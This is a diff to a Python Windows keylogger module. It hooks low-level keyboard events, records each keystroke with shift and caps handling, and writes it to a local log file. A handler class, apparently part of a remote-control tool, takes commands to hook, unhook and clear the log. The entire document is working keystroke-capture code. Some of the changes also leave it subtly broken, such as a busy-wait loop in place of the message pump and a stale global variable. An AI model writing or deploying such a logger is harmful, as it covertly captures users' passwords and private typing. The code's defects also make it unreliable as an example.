@@ -2,9 +2,6 @@ import ctypes
 from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
 from ctypes.wintypes import WPARAM, LPARAM, MSG, DWORD
 import threading
-from pathlib import Path
-import os
-import time
 
 from handler_state import HandlerState
 from vkcode import VK_CODE, VK_SHIFT, VK_CAPS_LOCK, NormalChar
@@ -16,12 +13,9 @@ WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
 
 msg = MSG()
-
 hook = None
-stop = False
-
-FILE_PATH = os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt")
 file = None
+stopEvent = threading.Event()
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
     _fields_ = [("vkCode", DWORD),
@@ -34,18 +28,15 @@ LLKP_decl = CFUNCTYPE(c_int, c_int, WPARAM, POINTER(KBDLLHOOKSTRUCT))
 
 def LowLevelKeyboardProc(nCode, wParam, lParam):
     global file, stop
-
-    assert file != None
-
-    #Check for SHIFT or CAPSLOCK
-    shifted = any([user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
-    capslocked = user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
-
-    vkCode = lParam.contents.vkCode
     if wParam == WM_KEYDOWN:
+        #Check for SHIFT or CAPSLOCK
+        shifted = any([user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
+        capslocked = user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
+
+        vkCode = lParam.contents.vkCode
         to_write = VK_CODE[vkCode]
 
-        if type(to_write) == list:
+        if type(to_write) == tuple:
             if shifted or capslocked:
                 to_write = to_write[1]
             else:
@@ -53,20 +44,20 @@ def LowLevelKeyboardProc(nCode, wParam, lParam):
 
         if not NormalChar(vkCode):
             to_write = ' ' + to_write + ' '
-
-        file.write(to_write)
-
-    if stop:
-        user32.UnhookWindowsHookEx(hook)
-        ctypes.windll.user32.PostQuitMessage(0)
+        if file:
+            file.write(to_write)
+    
     return user32.CallNextHookEx(hook, nCode, wParam, lParam)
 
+
 def Record():
-    global hook
+    global hook, stopEvent
     callback = LLKP_decl(LowLevelKeyboardProc)
     hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
-    while user32.GetMessageA(ctypes.byref(msg),None, 0,0):
+    while not stopEvent.is_set():
         pass
+    # while user32.GetMessageA(ctypes.byref(msg),None, 0,0):
+    #     pass
 
 def RecordWrapper():
     a = threading.Thread(target = Record)
@@ -105,10 +96,11 @@ class KeystrokeHandler:
                 self.Unhook()
                 pass
             elif reqCode == "CLEAR":
-                file.close()
-                file.open(self.filepath, "w")
-                file.close()
-                file.open(self.filepath, "a+")
+                if file:
+                    file.close()
+                    file = open(self.filepath, "w")
+                    file.close()
+                    file = open(self.filepath, "a+")
             else:
                 return HandlerState.INVALID, None
 
@@ -119,35 +111,40 @@ class KeystrokeHandler:
             return HandlerState.FAILED, None
 
     def Hook(self):
-        global stop, file
+        global file, stopEvent
 
         #Open file in append mode
         assert not self.hooked, "Hook is already installed"
 
         file = open(self.filepath, "a+")
         self.thread = RecordWrapper()
-        stop = False
         self.thread.start()
         self.hooked = True
+        stopEvent.clear()
 
     def Unhook(self):
-        global stop, file
+        global file, stopEvent
         
         assert self.hooked, "Hook is not installed"
-        stop = True
-        self.thread.join()
         
         if file:
             file.close()
             file = None
         self.hooked = False
+        stopEvent.set()
+        self.thread.join()
 
     def __del(self):
         self.Unhook()
         pass
 
+
 if __name__ == "__main__":
-    a = KeystrokeHandler(FILE_PATH)
+    from pathlib import Path
+    import os
+    import time
+    a = KeystrokeHandler(os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt"))
     a.Hook()
-    time.sleep(2)
+    m = input("a:")
+    ctypes.windll.user32.PostQuitMessage(0)
     a.Unhook()
